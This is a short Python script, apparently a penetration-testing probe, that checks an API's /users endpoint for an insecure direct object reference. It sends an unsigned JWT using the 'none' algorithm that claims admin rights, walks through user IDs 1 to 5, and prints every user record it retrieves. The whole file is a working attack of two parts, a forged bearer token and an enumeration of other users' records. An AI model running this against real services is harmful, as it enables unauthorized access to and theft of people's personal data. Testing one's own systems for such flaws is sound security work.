from urllib.request import Request, urlopen
import time

BASE_URL = "http://api.0x10.cloud/users?id="
TOKEN = "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."

headers = {
    "Authorization": f"Bearer {TOKEN}"
}

print("Testing for IDOR on /users endpoint...\n")

success_count = 0

for user_id in range(1, 6):
    try:
        req = Request(BASE_URL + str(user_id), headers=headers)
        response = urlopen(req, timeout=5)

        data = response.read().decode()
        
        print(f"[+] Accessed user ID {user_id}")
        print(f"Response: {data}\n")

        success_count += 1
        time.sleep(0.15)

    except Exception as e:
        print(f"[!] Error accessing user ID {user_id}: {e}")

if success_count > 1:
    print("VULNERABILITY: IDOR detected — multiple users accessible.")
else:
    print("No IDOR confirmed.")